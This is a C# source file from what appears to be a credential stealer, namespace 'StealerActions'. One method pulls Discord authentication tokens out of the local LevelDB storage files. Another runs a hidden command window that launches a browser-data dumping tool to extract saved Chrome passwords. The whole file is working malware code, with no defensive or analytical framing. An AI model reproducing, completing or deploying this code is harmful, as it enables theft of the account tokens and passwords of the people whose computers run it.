using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;
using System.Diagnostics;

namespace StealerActions
{
    class Steal
    {

        static public string getDiscordToken()
        {
            string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }
            return string2;
        }

        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }

        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }

        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }

        public static void getChromePasswords()
        {
            string temppath = "";

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default"))
            {
                temppath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
            }
            else
            {
                temppath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Profile 1";
            }

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            cmd.StandardInput.WriteLine("\"" + @Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\hack-browser-data-windows-32bit.exe" + "\"" +  @" -b chrome -p " + "\"" + @temppath + "\"");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            
        }
    }
}
        


